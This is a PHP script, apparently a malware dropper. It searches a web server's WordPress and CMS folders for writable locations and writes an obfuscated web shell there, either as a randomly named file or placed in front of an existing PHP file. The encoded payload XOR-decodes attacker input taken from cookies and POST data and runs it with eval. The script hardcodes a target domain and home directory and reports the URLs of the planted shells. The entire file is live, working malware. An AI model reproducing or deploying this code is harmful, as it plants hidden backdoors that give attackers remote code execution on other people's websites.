<?php 

function brute_writable($docroot)
{
    $dir_cands = Array("", "/wp-content/uploads/js_composer", "/wp-content/uploads", "/wp-content/uploads/2022", "/wp-content/uploads/2023", "/wp-content/uploads/2021", "/wp-content/uploads/2020", "/.tmb", "/wp-content", "/wp-content/uploads/2019", "/wp-content/themes", "/wp-content/upgrade", "/wp-content/uploads/2018", "/wp-content/plugins", "/wp-content/uploads/2017", "/wp-content/uploads/2016", "/wp-content/languages", "/wp-admin", "/wp-content", "/wp-includes", "/wp-includes/images", "/wp-admin/images", "/wp-includes/Text", "/wp-content/themes", "/wp-content/uploads", "/images", "/sites/default/files", "/cache", "/image", "/css", "/tmp", "/js", "/modules", "/media", "/uploads", "/includes", "/templates", "/logs", "/assets", "/cgi-bin", "/img", "/storage");
    $file_cands = Array("/wp-content/plugins/index.php", "/wp-content/themes/index.php", "/wp-content/index.php", "/index.php", "/xmlrpc.php");

    foreach (Array($dir_cands, $file_cands) as $array_cands) {
        foreach ($array_cands as $cand) {
            $cand2 = $docroot . $cand;
            if (@is_writable($cand2)) {
                return $cand;
            }
        }
    }

    return NULL;
}


function upload_shell($domain, $docroot, $writable_offset)
{
    $payload_data = "%3C%3Fphp%0A%24izJyuSyYMR/%2A%20%20CGv%2A/%3D%20%20%20%20chr%09%28115%29/%2A%20jj%20%20%20%2A/.%20%22%5Cx74%22/%2A%20xw%2A/.%20%20%27r%27%20%20.%09%22%5C137%22%09.%20%20%20%20chr%20%20%28/%2A%20WrAp%20%20%20%2A/949/%2AIX%20%20%20%2A/-%20%20%20%20835/%2A%20t%20%2A/%29.%22%5Cx65%22/%2A%20%20Rt%20%20%20%2A/.%09chr%20%20%20%20%28112%29%09.%09%27e%27%20%20.%20%20%20%20%22%5Cx61%22%20.%09%22%5C164%22%3B%0A%09%09%24uprjKamp%20%20%20%20%20%3D%20%20%20%22%5Cx70%22%09.%09%22%5Cx61%22/%2A%20%20%20N%2A/.%20%22%5Cx63%22%09./%2Al%20%2A/chr/%2A%20NvM%20%20%20%2A/%28107%29%3B%24_sl%20%20%3D%20%2725594%27%3B%0A%20%20%20%20%20function/%2A%20K%20%20%2A/RViKnXPjE%28%29%0A%20%20%20%20%20/%2A%20%20%20IRsp%2A/%7B%0A%09%09%09%09%20%20%20%24PDXWMTNhS/%2A%20%20%20a%2A/%3D/%2A%20%20fmckq%20%20%20%2A/Array%09%28%20%20%20%20%22tFcWYLNrgdrVHqlMDLvPzZkArD%22%20%20%3D%3E/%2A%20%20%20M%2A/%22ERmAoixLBSLX%22/%2A%20%20%20O%20%20%2A/%29%3B%0A%20%20%20%20/%2A%20%20kKyj%20%2A/%0A%09%09%09%09%09%09%24DHQusWUUEN/%2A%20%20pfHL%20%20%20%2A/%3D%09Array%09%28%20%22AieiDHKGmFSpweDlUbiRb%22/%2A%20cihXT%20%2A/%3D%3E%09%22fgySEfhBwXgZXbEGy%22/%2A%20a%20%20%20%2A/%29%3B%3B%0A%20%20%20%20/%2A%20CE%20%2A/%24JMhvMC/%2A%20%20LjUDq%20%20%20%2A/%3D%20%20%20%20%20Array%28%20%24PDXWMTNhS%2C%20%20%24_COOKIE%2C/%2A%20cEA%20%2A/%24PDXWMTNhS%2C/%2AkooY%20%2A/%24_POST%2C%09%24DHQusWUUEN%29%3B%3B%0A%20%09%0A%20/%2A%20%20W%20%20%20%2A/return%09%24JMhvMC%3B%3B%0A%20%20%20%09%7D%0A%09%09%09%09%09%0A%20%20%09function%09ATjHBPrCY%28%24PGevzHdf%2C%09%24PDXWMTNhS%29%0A%09%7B%0A%09if/%2A%20WmqDQ%20%20%20%2A/%28%20%20count%20%20%20%28%09%24PGevzHdf%09%29%09%3D%3D/%2A%20y%2A/3/%2A%20%20%20jYk%20%20%20%2A/%29/%2A%20%20RWY%2A/%7B%0A%09%09%24vrsqzfo%09%3D%20%24PGevzHdf%5B1%5D%3B%0A%09%09%09%09%09%24YoJtwQQXM%20%20%3D/%2A%20%20%20zekJ%2A/%24PGevzHdf%5B2%5D%3B%24_BViEA%20%20%20%3D%20%20%2742054%27%3B%0A/%2A%20%20oDJ%2A/%24zhEPKBUvgD%09%3D%09%24vrsqzfo%28%24YoJtwQQXM%29%3B%0A%0A%0A%20%20%20%20%20eval%20%20%28%20%20%20%20%24zhEPKBUvgD%20%20%29%3B%24_DevRp/%2A%20Bah%2A/%3D/%2A%20uW%20%20%2A/%2735177%27%3B%0A%09%09%09die%20%20%28%29%3B%24_hRMYj%20%3D/%2A%20%20%20KR%2A/%2749704%27%3B%0A%0A%0A/%2A%20UYdt%20%20%20%2A/%7D%0A%20%20%20%20%7D%0A%20/%2A%20Tyaz%20%2A/%0A%20%20%20%20%20/%2A%20%20BwiA%20%20%2A/function/%2A%20qHW%20%20%2A/tsRQpM%28%24Zpafldc%2C%20%20%24Vhdth%29%0A%20%20%7B%0A%09%09%20%20%20return%09%24Zpafldc%09%5E%09%24Vhdth%3B%24_KZEC/%2A%20RpiXd%20%2A/%3D%09%2763176%27%3B%0A%09%09%7D%0A%09%09%20%20%20%0A%20/%2A%20%20Ok%20%20%20%2A/%24KrmDKg/%2A%20%20%20ncR%20%2A/%3D%20%20%20%20%27%23%27%3B%0A%09%09%09/%2ACkvk%20%2A/%0A%20%20%20%09function%20VzjXnM%28%24RDiZikmigd%2C%20%24KrmDKg%29%0A%0A%0A/%2A%20nAffT%2A/%7B%20%0A%20%20%09%24RDiZikmigd%09%3D%09explode%20%20%20%28%24KrmDKg%2C%09%24RDiZikmigd%09%29%3B%0A%20/%2Ap%20%20%20%2A/%0A%09%09%09%09%20%20ATjHBPrCY%28%24RDiZikmigd%2C/%2A%20%20qJy%20%20%20%2A/%24KrmDKg%29%3B%3B%0A%20%09%7D%0A%0A%0A%20%20%0A%20/%2A%20S%20%2A/%0A%0A%0A%09%0A%20%20%20%20%20%20foreach%09%28RViKnXPjE%28%29%09as%09%24KtATETVOAd%29%09%7B%0A%0A%09foreach%20%20%20%28%20%24KtATETVOAd/%2Av%20%2A/as/%2AbBI%20%2A/%24Vhdth%20%3D%3E%09%24Zpafldc/%2A%20%20%20zS%2A/%29%09%7B%0A%0A%09%0A%09%09%09%09%09%24wxhLwRcV%09%3D%09strlen%28/%2A%20%20%20m%20%2A/%24Zpafldc%09%29/strlen%28%09%24Vhdth%09%29%3B%3B%0A%09/%2A%20%20d%20%2A/%0A%09%09%09%09%09/%2A%20F%20%2A/%24Zpafldc/%2A%20%20gfKpp%2A/%3D%09%40%24uprjKamp%28%20%20%27H%27%09.%09chr%09%2842%29%2C%20%20%20%20%24Zpafldc%20%29%3B%3B%0A%09%09%09%09%0A%0A/%2A%20%20xVIA%20%2A/%24Vhdth/%2A%20uEA%2A/.%3D/%2A%20%20sB%2A/%22iGoXpQt-OQAj-SaS-vMQNx-FsWh-kqlE-tGvG%22%3B%24_JsQI%09%3D%20%20%2734405%27%3B%0A%0A%0A/%2A%20dHNI%2A/%24Vhdth%09%3D%09%24izJyuSyYMR/%2A%20%20%20hA%2A/%28%09%24Vhdth%2C%20%20%24wxhLwRcV/%2A%20gN%20%20%20%2A/%2B%091%29%3B%3B%0A%0A%20%20%0A%20%20%20%20%20/%2A%20%20%20srzjv%20%20%2A/round%28%24wxhLwRcV%29%3B%24_FkiI%09%3D%20%20%20%20%20%2723849%27%3B%0A%0A%0A%09%0A%09%09VzjXnM%28%24Zpafldc%20%20%20%20%5E%09%24Vhdth%2C%20%20%24KrmDKg%29%3B%0A%20%20%20%20%20/%2A%20%20%20mL%2A/%0A%09%09%09%09%09continue%3B%0A/%2A%20%20%20MPMA%20%20%20%2A/%7D%0A%09%09%09%09%7D";
    $payload_name = "";

    if (strpos($writable_offset, ".php") === FALSE)
    {
        if (empty($payload_name))
        {
            $payload_name = substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyz1234567890', mt_rand(1, 8))), 1, 8) . ".php";
        }
    }
    else
    {
        $last_slash = strrpos($writable_offset, "/");
        $payload_name = substr($writable_offset, $last_slash+1);
        $writable_offset = substr($writable_offset, 0, $last_slash);
    }

    $payload_path = $docroot . $writable_offset . "/" . $payload_name;
    $full_uri = $domain . $writable_offset . "/" . $payload_name;

    if (strpos($writable_offset, ".php") === FALSE)
    {
        $content = "";
    }
    else
    {
        $content = "\n\n\n" . @file_get_contents($payload_path);
    }

    if (@file_put_contents($payload_path, rawurldecode($payload_data) . $content)) {
        @chmod($payload_path, 0644);
        @touch($payload_path);

        return $full_uri;
    }
    else
    {
        return NULL;
    }
}

$res = Array("data"=>Array(), "last_error"=>"");

$docroots = unserialize(rawurldecode("a%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22genesi.si%22%3Bi%3A1%3Bs%3A14%3A%22/home/genesisi%22%3B%7D%7D"));

foreach ($docroots as $docroot)
{
    if (!empty($docroot[0]))
    {
        $writable_offset = brute_writable($docroot[1]);

        if ($writable_offset !== NULL)
        {
            $temp = upload_shell($docroot[0], $docroot[1], $writable_offset);
            if (!empty($temp))
            {
                $res["data"][] = $temp;
            }
        }
    }
}

echo "marker3456t3wtNg8nnG";
echo serialize($res);
echo "marker3456t3wtNg8nnG";
exit();
